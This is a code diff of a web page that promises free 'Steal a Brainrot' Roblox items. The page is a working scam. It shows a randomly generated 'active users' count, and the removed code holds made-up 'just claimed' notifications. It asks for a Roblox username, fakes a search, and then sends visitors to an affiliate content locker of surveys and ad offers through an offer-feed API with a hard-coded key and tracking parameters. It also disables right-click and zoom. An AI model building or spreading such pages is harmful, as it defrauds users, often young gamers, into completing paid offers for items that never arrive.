+            width: 30px;
+            height: 30px;
+            background-color: var(--primary-green);
             transform: rotateZ(87deg);
+            box-shadow: 0 0 20px rgba(84, 211, 58, 0.6);
         }
 
         .folding .sk-cube {
@@ -556,14 +916,14 @@
             transform: scale(1.1);
         }
 
-        .folding .sk-cube:before {
+        .folding .sk-cube::before {
             content: "";
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: #fff;
+            background: linear-gradient(135deg, #fff, var(--primary-green));
             animation: sk-foldCubeAngle 2.4s infinite linear both;
             transform-origin: 100% 100%;
         }
@@ -580,15 +940,15 @@
             transform: scale(1.1) rotateZ(270deg);
         }
 
-        .folding .sk-cube2:before {
+        .folding .sk-cube2::before {
             animation-delay: 0.3s;
         }
 
-        .folding .sk-cube3:before {
+        .folding .sk-cube3::before {
             animation-delay: 0.6s;
         }
 
-        .folding .sk-cube4:before {
+        .folding .sk-cube4::before {
             animation-delay: 0.9s;
         }
 
@@ -609,33 +969,39 @@
 
         .searching-text {
             color: white;
-            font-size: 16px;
-            margin-top: 15px;
+            font-size: 18px;
+            margin-top: 20px;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
         }
 
         .result-username {
             color: white;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
-            margin: 12px 0;
+            margin: 15px 0;
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5), 0 0 15px rgba(84, 211, 58, 0.5);
         }
 
         .get-item-now-btn {
-            background-color: white;
+            background: linear-gradient(135deg, white, #f0f0f0);
             color: #333;
-            border: none;
-            padding: 10px;
-            border-radius: 4px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            padding: 14px;
+            border-radius: 10px;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
-            font-size: 14px;
-            margin-top: 12px;
-            transition: all 0.3s;
+            font-size: 15px;
+            margin-top: 15px;
+            transition: all var(--transition-normal);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
 
         .get-item-now-btn:hover {
-            background-color: #f0f0f0;
+            background: linear-gradient(135deg, #f0f0f0, white);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            border-color: rgba(255, 215, 0, 0.5);
         }
 
         .d-none {
@@ -644,34 +1010,84 @@
 
         .user-error {
             color: #ff6b6b;
-            font-size: 12px;
-            margin-top: 5px;
+            font-size: 13px;
+            margin-top: 8px;
             text-align: center;
+            animation: shake 0.5s ease;
+            padding: 8px;
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 107, 107, 0.3);
         }
 
-        /* Responsive Styles */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        @keyframes scaleIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes expandWidth {
+            from { width: 0; }
+            to { width: 80%; }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
         @media (min-width: 480px) {
             .items-grid {
-                gap: 10px;
-            }
-            
-            .item-img {
-                width: 65px;
-                height: 65px;
-            }
-            
-            .item-name {
-                font-size: 0.8em;
-            }
-            
-            .select-title {
-                font-size: 1.2em;
-            }
-        }
-
-        @media (min-width: 768px) {
-            .items-grid {
-                gap: 12px;
+                gap: 14px;
             }
             
             .item-img {
@@ -684,26 +1100,27 @@
             }
             
             .select-title {
-                font-size: 1.4em;
+                font-size: 1.3em;
             }
-            
-            .active-users-box {
-                font-size: 1em;
-                min-width: 170px;
-                padding: 10px 15px;
-                height: 42px;
+
+            .locker-box {
+                max-width: 380px;
+                padding: 24px;
             }
         }
 
-        @media (min-width: 992px) {
+        @media (min-width: 768px) {
             .items-grid {
-                grid-template-columns: repeat(5, 1fr);
-                gap: 15px;
+                gap: 16px;
             }
             
             .item-img {
-                width: 80px;
-                height: 80px;
+                width: 75px;
+                height: 75px;
+            }
+            
+            .item-name {
+                font-size: 0.9em;
             }
             
             .select-title {
@@ -711,32 +1128,62 @@
             }
             
             .active-users-box {
-                font-size: 1.1em;
-                min-width: 190px;
+                font-size: 1.05em;
+                min-width: 180px;
                 padding: 12px 18px;
                 height: 48px;
+            }
+
+            .locker-box {
+                max-width: 420px;
+            }
+        }
+
+        @media (min-width: 992px) {
+            .items-grid {
+                grid-template-columns: repeat(5, 1fr);
+                gap: 18px;
+            }
+            
+            .item-img {
+                width: 85px;
+                height: 85px;
+            }
+            
+            .select-title {
+                font-size: 1.6em;
+            }
+            
+            .active-users-box {
+                font-size: 1.1em;
+                min-width: 200px;
+                padding: 14px 20px;
+                height: 52px;
+            }
+
+            .locker-box {
+                max-width: 450px;
             }
         }
     </style>
 </head>
-
 <body>
     <div class="container">
         <div class="logo-container">
             <img src="https://static.wikia.nocookie.net/stealabr/images/7/76/Childhood_gambling.png" alt="Steal a Brainrot Logo">
         </div>
-        
+
         <div class="select-title">
             STEAL A BRAINROT
         </div>
-        
+
         <div class="top-bar">
             <div class="active-users-box">
                 <span>Active users :</span>
                 <span class="active-users-count" id="activeUsersCount"></span>
             </div>
         </div>
-        
+
         <div class="select-title">
             SELECT UP TO 3 ITEMS YOU WISH TO GET FREE ITEM
         </div>
@@ -749,15 +1196,15 @@
             <div class="item-card">
                 <img alt="Celularcini Viciosini" class="item-img" src="https://i.postimg.cc/0NS1PCXR/Clear-background-clear-meowl-image.webp" />
                 <div class="item-name">Meowl</div>
-                </div>
+            </div>
             <div class="item-card">
                 <img alt="LOS TACO BLOCKS" class="item-img" src="https://i.postimg.cc/YqzZCCMT/Los-Taco-Blocks-INGAME.webp" />
                 <div class="item-name">LOS TACO BLOCKS</div>
-                </div>
+            </div>
             <div class="item-card">
                 <img alt="Dul Dul Dul" class="item-img" src="https://i.postimg.cc/5015Y20j/Dul-Dul-Dul.webp" />
                 <div class="item-name">Dul Dul Dul</div>
-                </div>
+            </div>
             <div class="item-card">
                 <img alt="Dragon cannelloni" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/3/31/Nah_uh.png" />
                 <div class="item-name">Dragon cannelloni</div>
@@ -765,273 +1212,448 @@
             <div class="item-card">
                 <img alt="67" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/8/83/BOIIIIIII_SIX_SEVEN_%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82%F0%9F%98%82.png" />
                 <div class="item-name">67</div>
-        </div>
+            </div>
             <div class="item-card">
                 <img alt="Tralaledon" class="item-img" src="https://i.postimg.cc/MKm6Xxz3/Tung-Tung-Sahur.webp" />
                 <div class="item-name">Tung Tung Tung Sahur</div>
-        </div>
+            </div>
             <div class="item-card">
                 <img alt="Strawberry Elephant" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/5/58/Strawberryelephant.png" />
                 <div class="item-name">Strawberry Elephant</div>
-        </div>
+            </div>
             <div class="item-card">
                 <img alt="ToToTo Sahur" class="item-img" src="https://i.postimg.cc/P5mwDpf9/Casa-Booo.webp" />
                 <div class="item-name">La Casa Boo</div>
-                    </div>
+            </div>
             <div class="item-card">
                 <img alt="Helicopterino" class="item-img" src="https://i.postimg.cc/L6dggKYd/Garamadundung.webp" />
                 <div class="item-name">Garama and Madundung</div>
-                </div>
+            </div>
             <div class="item-card">
                 <img alt="Tictac sahur" class="item-img" src="https://i.postimg.cc/BvHkdnt0/Fragrama.webp" />
                 <div class="item-name">Fragrama and Chocrama</div>
-                    </div>
+            </div>
             <div class="item-card">
                 <img alt="Tung Tung sahur" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/e/e3/Tung_Tung_Tung_Sahur.png" />
                 <div class="item-name">Tung Tung sahur</div>
-                </div>
+            </div>
             <div class="item-card">
                 <img alt="La vacca saturno" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/5/5f/Candy_La_Vacca_Saturno_Saturnita.png" />
                 <div class="item-name">La vacca saturno</div>
-                    </div>
+            </div>
             <div class="item-card">
                 <img alt="La grande" class="item-img" src="https://i.postimg.cc/zGxT0Qqq/Cooki-and-milki.webp" />
                 <div class="item-name">Cooki and Milki</div>
-                </div>
+            </div>
             <div class="item-card">
                 <img alt="La Cucaracha" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/4/46/La_Cucaracha.png" />
                 <div class="item-name">La Cucaracha</div>
-                    </div>
+            </div>
             <div class="item-card">
                 <img alt="La Bros" class="item-img" src="https://static.wikia.nocookie.net/stealabr/images/5/53/BROOOOOOOO.png" />
                 <div class="item-name">La Bros</div>
-                </div>
             </div>
         </div>
-        
+
         <button id="continue-btn">Continue</button>
     </div>
-    
-    <div class="cliameds"></div>
-    
+
     <div class="purchase-popup" id="purchase-popup">
-        <div class="popup-content">
+        <div class="popup-content"></div>
+    </div>
+
+    <!-- LOCKER OVERLAY - COMPACT & MOBILE OPTIMIZED -->
+    <div id="locker" class="locker-overlay">
+        <div class="locker-box">
+            <span class="close-btn" onclick="closeLocker()" aria-label="Close">×</span>
+            
+            <div class="selected-items-preview" id="selectedItemsPreview"></div>
+            
+            <h2 class="game-title">Steal a Brainrot</h2>
+
+            <div class="secure-badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Secure items From Bots</span>
+            </div>
+
+            <p class="instruction-text">
+                Choose one of offer in the list below. Complete the task and your items will be claimed <span class="highlight">automatically</span>.
+            </p>
+
+            <div class="note-box">
+                <strong>NOTE:</strong>
+                <p>if an offer doesn't open, try another. Complete Offer Exactly To make sur Received your items .</p>
+            </div>
+
+            <div class="offers-prompt">Choose an offer below:</div>
+            
+            <div class="offers-list" id="offersList">
+                <div style="color: #fff; text-align: center; padding: 15px; font-size: 0.75em;">Loading offers...</div>
+            </div>
         </div>
     </div>
-    
+
     <audio id="dingSound" preload="auto">
         <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
     </audio>
     <audio id="clickSound" preload="auto">
         <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
     </audio>
-    
+
     <script>
-        // CONFIGURATION - REPLACE WITH YOUR OGADS LOCKER LINK
-        const OGADS_LOCKER_LINK = "https://applocked.org/cl/i/veopox";
-        
-        // Current selection state
-        let popupOpen = false;
+        // ===== CONFIGURATION =====
+        const CONFIG = {
+            API_KEY: "3b17a09c1ca2bba2d52ffadab4894374",
+            USER_ID: "504359",
+            API_URL: "https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php",
+            MAX_SELECTIONS: 3,
+            ACTIVE_USERS_INTERVAL: 4500
+        };
 
-        // Function to generate random number between 90 and 900
-        function randomUsers() {
-            return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
-        }
+        // ===== STATE MANAGEMENT =====
+        const State = {
+            popupOpen: false,
+            selectedItems: []
+        };
 
+        // ===== UTILITY FUNCTIONS =====
+        const Utils = {
+            randomUsers: () => Math.floor(Math.random() * (900 - 90 + 1)) + 90,
+            
+            playSound: (soundId) => {
+                const sound = document.getElementById(soundId);
+                if (sound) {
+                    sound.currentTime = 0;
+                    sound.play().catch(() => {});
+                }
+            },
+
+            escapeHtml: (text) => {
+                const div = document.createElement('div');
+                div.textContent = text;
+                return div.innerHTML;
+            }
+        };
+
+        // ===== DISABLE RIGHT CLICK =====
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // ===== DISABLE ZOOM =====
+        document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+            }
+        }, { passive: false });
+
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(event) {
+            const now = Date.now();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+
+        // ===== ACTIVE USERS =====
         function updateActiveUsers() {
-            document.getElementById('activeUsersCount').textContent = randomUsers();
-        }
-        updateActiveUsers();
-        setInterval(updateActiveUsers, 4500);
-
-        // Notifications code
-        const avatars = [
-            'https://dress2.pages.dev/avatars/avatar1.png', 'https://dress2.pages.dev/avatars/avatar2.png', 'https://dress2.pages.dev/avatars/avatar3.png', 'https://dress2.pages.dev/avatars/avatar4.png', 'https://dress2.pages.dev/avatars/avatar5.png', 'https://dress2.pages.dev/avatars/avatar6.png', 'https://dress2.pages.dev/avatars/avatar7.png', 'https://dress2.pages.dev/avatars/avatar8.png', 'https://dress2.pages.dev/avatars/avatar9.png', 'https://dress2.pages.dev/avatars/avatar10.png'
-        ];
-        const items = [
-            'Super-Seed', 'Night-Egg', 'Candy-Blossom', 'Queen-bee', 'Dragonfly', 'Golden Lab ', ' Flower-Seed ', ' Dragon fruit', 'Mango', ' Grapwes', 'Mushroom', 'Star-Caller', 'Master-Sprinkler', 'Favorite-Tool', 'Harvest-tool', 'Honey-Sprinkler', 'Pepper', 'Cacao', 'Beanstalk',
-        ];
-        const usernames = [
-            'MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11', 'HAMZA22', 'tbonmk2', 'caroline34', 'dimaraja10', 'asktiyal9hba', 'ronaldo7', 'sidi_binzarn1', 'DERKAOUI_ZAML1', 'Tizit.botsot', 'Achnid22'
-        ];
-        let notificationInterval;
-
-        function startNotifications() {
-            if (popupOpen) return;
-            notificationInterval = setInterval(function() {
-                if (popupOpen) return;
-                $(".cliameds").fadeIn();
-                var html = `
-          <div class="message">
-            <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
-            <div class="more">
-              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
-              <div> JUST CLAIMED '${items[Math.floor(Math.random() * items.length)]}'</div>
-            </div>
-          </div>
-        `;
-                $(".cliameds").html(html);
-                setTimeout(function() {
-                    $(".cliameds").fadeOut();
-                }, 3000);
-            }, 5000);
-        }
-
-        function stopNotifications() {
-            clearInterval(notificationInterval);
-            $(".cliameds").fadeOut();
-        }
-        startNotifications();
-
-        // OPEN OGADS LOCKER
-        function openLocker(username, itemName, itemImages) {
-            // Redirect to your OGAds locker
-            if (OGADS_LOCKER_LINK && OGADS_LOCKER_LINK !== "YOUR_OGADS_LOCKER_LINK_HERE") {
-                window.location.href = OGADS_LOCKER_LINK;
-            } else {
-                alert("Please configure your OGAds locker link in the code!");
+            const countElement = document.getElementById('activeUsersCount');
+            if (countElement) {
+                countElement.textContent = Utils.randomUsers();
             }
         }
 
-        // Fixed username popup functions
-        const showPurchasePopup = (itemName, itemImages) => {
-            popupOpen = true;
-            stopNotifications();
-            document.body.classList.add('no-scroll');
-            const popup = document.getElementById('purchase-popup');
-            const popupContent = popup.querySelector('.popup-content');
+        updateActiveUsers();
+        setInterval(updateActiveUsers, CONFIG.ACTIVE_USERS_INTERVAL);
 
-            const selectedCount = itemImages.length;
-            const promptText = selectedCount > 1 ?
-                `Would you like to get these ${selectedCount} items?` :
-                `Would you like to Get "<span>${itemName}</span>"?`;
-
-            let imagesHTML = '<div class="selected-images-container">';
-            itemImages.forEach(src => {
-                imagesHTML += `<img src="${src}" alt="Selected Item" class="item-popup-image-small">`;
-            });
-            imagesHTML += '</div>';
-
-            popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item(s)</h3>
-        </div>
-        ${imagesHTML}
-        <p class="item-confirm">${promptText}</p>
-        <div class="input-group">
-          <input type="text" id="username-input" placeholder="Enter your Roblox username">
-        </div>
-        <div class="user-error d-none">Please enter a valid username</div>
-        <div class="popup-buttons">
-          <button class="cancel-btn">Cancel</button>
-          <button class="free-btn" id="search-user-btn">
-            <span class="free-icon"></span>
-            <span class="free-badge">Free</span>
-          </button>
-        </div>
-      `;
-            popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
-            popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
-                const clickSound = document.getElementById('clickSound');
-                clickSound.currentTime = 0;
-                clickSound.play();
-                const username = document.getElementById('username-input').value.trim();
-                if (!username) {
-                    document.querySelector('.user-error').classList.remove('d-none');
-                    return;
+        // ===== LOCKER SYSTEM =====
+        const LockerSystem = {
+            open: function(username, itemName, itemImages) {
+                State.popupOpen = true;
+                document.body.classList.add('no-scroll');
+                
+                const continueBtn = document.getElementById('continue-btn');
+                if (continueBtn) {
+                    continueBtn.style.display = 'none';
                 }
-                showSearchingState(username, itemName, itemImages);
-            });
-            popup.style.display = 'flex';
-            document.getElementById('username-input').focus();
+                
+                const locker = document.getElementById("locker");
+                if (locker) {
+                    locker.style.display = "flex";
+                }
+                
+                // Display all selected items
+                const selectedItemsPreview = document.getElementById("selectedItemsPreview");
+                if (selectedItemsPreview) {
+                    selectedItemsPreview.innerHTML = '';
+                    itemImages.forEach(imgSrc => {
+                        const img = document.createElement('img');
+                        img.src = imgSrc;
+                        img.className = 'selected-item-preview';
+                        img.alt = 'Selected Item';
+                        selectedItemsPreview.appendChild(img);
+                    });
+                }
+                
+                this.loadOffers();
+            },
+
+            loadOffers: function() {
+                const offersList = document.getElementById("offersList");
+                if (!offersList) return;
+                
+                offersList.innerHTML = "<div style='color: #fff; text-align: center; padding: 15px; font-size: 0.75em;'>Loading offers...</div>";
+                
+                const apiUrl = `${CONFIG.API_URL}?user_id=${CONFIG.USER_ID}&api_key=${CONFIG.API_KEY}&s1=steal%20a%20brainrot&s2=`;
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                fetch(apiUrl, {
+                    signal: controller.signal
+                })
+                .then(res => res.json())
+                .then(offers => {
+                    clearTimeout(timeoutId);
+                    
+                    if (!offers || !Array.isArray(offers) || offers.length === 0) {
+                        this.showFallbackOffers();
+                        return;
+                    }
+                    
+                    this.displayOffers(offers);
+                })
+                .catch((error) => {
+                    clearTimeout(timeoutId);
+                    console.log('Error loading offers:', error);
+                    this.showFallbackOffers();
+                });
+            },
+
+            showFallbackOffers: function() {
+                const fallbackOffers = [
+                    {
+                        anchor: "Complete Quick Survey (1-2 minutes)",
+                        url: "#",
+                        network_icon: "https://cdn.affise.com/affise-media-service-prod/offers/959/30554/541589117.200x200.jpeg"
+                    },
+                    {
+                        anchor: "Watch Short Video Ad (45-60 seconds)",
+                        url: "#",
+                        network_icon: "https://banners.hangmyads.com/files/uploads/Off_A_101022.png"
+                    }
+                ];
+                
+                this.displayOffers(fallbackOffers);
+            },
+
+            displayOffers: function(offers) {
+                const offersList = document.getElementById("offersList");
+                if (!offersList) return;
+                
+                let html = "";
+                
+                // ONLY 2 OFFERS
+                offers.slice(0, 2).forEach((offer) => {
+                    const offerTitle = offer.anchor || offer.name || "Complete Offer";
+                    const offerUrl = offer.url || "#";
+                    const offerIcon = offer.network_icon || "https://via.placeholder.com/40";
+                    
+                    html += `
+                        <button class="offer-button" onclick="LockerSystem.selectOffer('${offerUrl.replace(/'/g, "\\'")}', '${Utils.escapeHtml(offerTitle).replace(/'/g, "\\'")}')">
+                            <img src="${offerIcon}" alt="Offer" class="offer-icon" onerror="this.src='https://via.placeholder.com/40'">
+                            <span class="offer-text">${Utils.escapeHtml(offerTitle)}</span>
+                        </button>
+                    `;
+                });
+                
+                if (html === "") {
+                    html = "<div style='color: #fff; text-align: center; padding: 15px; font-size: 0.75em;'>No offers available at the moment.</div>";
+                }
+                
+                offersList.innerHTML = html;
+            },
+
+            selectOffer: function(url, offerTitle) {
+                console.log(`🎯 Offer selected: ${offerTitle}`);
+                
+                Utils.playSound('clickSound');
+                
+                if (url && url !== "#") {
+                    const trackingParams = `&sub2=u${CONFIG.USER_ID}&sub7=rfnull&sub8=rdnull&sub15=stealabrainrot`;
+                    const trackedUrl = url + (url.includes('?') ? '&' : '?') + trackingParams;
+                    
+                    window.open(trackedUrl, '_blank');
+                    
+                    setTimeout(() => {
+                        alert(`✅ Thank you! Complete the offer to claim your items to your username.`);
+                    }, 1000);
+                } else {
+                    alert(`✅ Thank you! Your selection has been recorded.`);
+                }
+            },
+
+            close: function() {
+                const locker = document.getElementById("locker");
+                if (locker) {
+                    locker.style.display = "none";
+                }
+                
+                document.body.classList.remove('no-scroll');
+                State.popupOpen = false;
+            }
         };
 
-        const closePurchasePopup = () => {
-            document.getElementById('purchase-popup').style.display = 'none';
-            document.body.classList.remove('no-scroll');
-            popupOpen = false;
-            startNotifications();
+        // ===== PURCHASE POPUP =====
+        const PurchasePopup = {
+            show: function(itemName, itemImages) {
+                State.popupOpen = true;
+                document.body.classList.add('no-scroll');
+                
+                const continueBtn = document.getElementById('continue-btn');
+                if (continueBtn) {
+                    continueBtn.style.display = 'none';
+                }
+                
+                const popup = document.getElementById('purchase-popup');
+                const popupContent = popup.querySelector('.popup-content');
+                const selectedCount = itemImages.length;
+                
+                const promptText = selectedCount > 1 ?
+                    `Would you like to get these ${selectedCount} items?` :
+                    `Would you like to Get "<span>${itemName}</span>"?`;
+                
+                let imagesHTML = '<div class="selected-images-container">';
+                itemImages.forEach(src => {
+                    imagesHTML += `<img src="${src}" alt="Selected Item" class="item-popup-image-small">`;
+                });
+                imagesHTML += '</div>';
+                
+                popupContent.innerHTML = `
+                    <div class="popup-header">
+                        <h3>Get Item(s)</h3>
+                    </div>
+                    ${imagesHTML}
+                    <p class="item-confirm">${promptText}</p>
+                    <div class="input-group">
+                        <input type="text" id="username-input" placeholder="Enter your Roblox username" autocomplete="username">
+                    </div>
+                    <div class="user-error d-none">Please enter a valid username</div>
+                    <div class="popup-buttons">
+                        <button class="cancel-btn">Cancel</button>
+                        <button class="free-btn" id="search-user-btn">
+                            <span class="free-icon"></span>
+                            <span class="free-badge">Free</span>
+                        </button>
+                    </div>
+                `;
+                
+                popupContent.querySelector('.cancel-btn').addEventListener('click', this.close);
+                
+                const searchBtn = popupContent.querySelector('#search-user-btn');
+                searchBtn.addEventListener('click', () => {
+                    Utils.playSound('clickSound');
+                    const username = document.getElementById('username-input').value.trim();
+                    const errorDiv = document.querySelector('.user-error');
+                    
+                    if (!username || username.length < 3) {
+                        if (errorDiv) errorDiv.classList.remove('d-none');
+                        return;
+                    }
+                    
+                    if (errorDiv) errorDiv.classList.add('d-none');
+                    this.showSearching(username, itemName, itemImages);
+                });
+                
+                popup.style.display = 'flex';
+                
+                setTimeout(() => {
+                    const input = document.getElementById('username-input');
+                    if (input) input.focus();
+                }, 100);
+            },
+
+            showSearching: function(username, itemName, itemImages) {
+                const popupContent = document.querySelector('.popup-content');
+                popupContent.innerHTML = `
+                    <div class="popup-header">
+                        <h3>Get Item(s)</h3>
+                    </div>
+                    <div style="text-align:center;padding:15px">
+                        <div class="folding">
+                            <div class="sk-cube1 sk-cube"></div>
+                            <div class="sk-cube2 sk-cube"></div>
+                            <div class="sk-cube4 sk-cube"></div>
+                            <div class="sk-cube3 sk-cube"></div>
+                            <div class="square"></div>
+                        </div>
+                        <p class="searching-text">Searching for @${Utils.escapeHtml(username)}</p>
+                    </div>
+                `;
+                
+                setTimeout(() => {
+                    this.showSuccess(username, itemName, itemImages);
+                }, 2000);
+            },
+
+            showSuccess: function(username, itemName, itemImages) {
+                const popupContent = document.querySelector('.popup-content');
+                popupContent.innerHTML = `
+                    <div class="popup-header">
+                        <h3>Get Item(s)</h3>
+                    </div>
+                    <div style="text-align:center;padding:15px">
+                        <p class="result-username">@${Utils.escapeHtml(username)}</p>
+                        <button class="get-item-now-btn">Continue</button>
+                    </div>
+                `;
+                
+                const continueBtn = popupContent.querySelector('.get-item-now-btn');
+                continueBtn.addEventListener('click', () => {
+                    Utils.playSound('clickSound');
+                    this.close();
+                    LockerSystem.open(username, itemName, itemImages);
+                });
+            },
+
+            close: function() {
+                const popup = document.getElementById('purchase-popup');
+                if (popup) {
+                    popup.style.display = 'none';
+                }
+                document.body.classList.remove('no-scroll');
+                State.popupOpen = false;
+                
+                const selectedCount = document.querySelectorAll('.item-card.selected').length;
+                const continueBtn = document.getElementById('continue-btn');
+                if (continueBtn && selectedCount > 0) {
+                    continueBtn.classList.add('show');
+                } else if (continueBtn) {
+                    continueBtn.classList.remove('show');
+                }
+            }
         };
 
-        const showSearchingState = (username, itemName, itemImages) => {
-            const popupContent = document.querySelector('.popup-content');
-            popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item(s)</h3>
-        </div>
-        <div style="text-align:center;padding:15px">
-          <div class="folding">
-            <div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div>
-          </div>
-          <p class="searching-text">Searching for @${username}</p>
-        </div>
-      `;
-            
-            // Simulate API call with timeout
-            setTimeout(() => {
-                // For demo purposes, we'll simulate a successful response
-                showSuccessState(username, itemName, itemImages);
-            }, 2000);
-        };
-
-        const showSuccessState = (username, itemName, itemImages) => {
-            const popupContent = document.querySelector('.popup-content');
-            popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Get Item(s)</h3>
-        </div>
-        <div style="text-align:center;padding:15px">
-          <p class="result-username">@${username}</p>
-          <button class="get-item-now-btn">Continue</button>
-        </div>
-      `;
-            popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
-                const clickSound = document.getElementById('clickSound');
-                clickSound.currentTime = 0;
-                clickSound.play();
-                // OPEN LOCKER HERE - After user verification is complete
-                closePurchasePopup();
-                openLocker(username, itemName, itemImages);
-            });
-        };
-
-        const showErrorState = (username, itemName, itemImages) => {
-            const popupContent = document.querySelector('.popup-content');
-            popupContent.innerHTML = `
-        <div class="popup-header">
-          <h3>Error</h3>
-        </div>
-        <div style="text-align:center;padding:15px">
-          <p class="searching-text" style="color: #ff6b6b;">User @${username} not found</p>
-          <button class="get-item-now-btn" id="retry-btn">Try Again</button>
-        </div>
-      `;
-            popupContent.querySelector('#retry-btn').addEventListener('click', function() {
-                showPurchasePopup(itemName, itemImages);
-            });
-        };
-
-        // --- ORIGINAL SCRIPT ---
+        // ===== ITEM SELECTION =====
         $(document).ready(function() {
-            const dingSound = document.getElementById('dingSound');
-            const MAX_SELECTIONS = 3;
+            const MAX_SELECTIONS = CONFIG.MAX_SELECTIONS;
             const $limitMessage = $('#selection-limit-message');
-
-            // Item Selection Logic
-            $('.item-card').click(function() {
+            
+            $('.item-card').on('click', function() {
                 const $this = $(this);
                 const isSelected = $this.hasClass('selected');
                 const selectedCount = $('.item-card.selected').length;
-
+                
                 $limitMessage.hide();
-
+                
                 if (isSelected) {
                     $this.removeClass('selected');
                 } else {
                     if (selectedCount < MAX_SELECTIONS) {
                         $this.addClass('selected');
-                        dingSound.currentTime = 0;
-                        dingSound.play();
+                        Utils.playSound('dingSound');
                     } else {
                         $limitMessage.show();
                         setTimeout(() => {
@@ -1039,30 +1661,35 @@
                         }, 2500);
                     }
                 }
-
+                
+                const continueBtn = $('#continue-btn');
                 if ($('.item-card.selected').length > 0) {
-                    $('#continue-btn').show();
+                    continueBtn.addClass('show');
                 } else {
-                    $('#continue-btn').hide();
+                    continueBtn.removeClass('show');
                 }
             });
-
-            // Continue Button Click Logic
-            $('#continue-btn').click(function() {
+            
+            $('#continue-btn').on('click', function() {
                 const selectedItems = $('.item-card.selected');
                 if (selectedItems.length === 0) return;
-
+                
                 const itemNames = selectedItems.map(function() {
                     return $(this).find('.item-name').text().trim();
                 }).get().join(', ');
-
+                
                 const itemImages = selectedItems.map(function() {
                     return $(this).find('.item-img').attr('src');
                 }).get();
-
-                showPurchasePopup(itemNames, itemImages);
+                
+                PurchasePopup.show(itemNames, itemImages);
             });
         });
+
+        // ===== GLOBAL FUNCTIONS FOR HTML ONCLICK =====
+        function closeLocker() {
+            LockerSystem.close();
+        }
     </script>
 </body>
 </html>
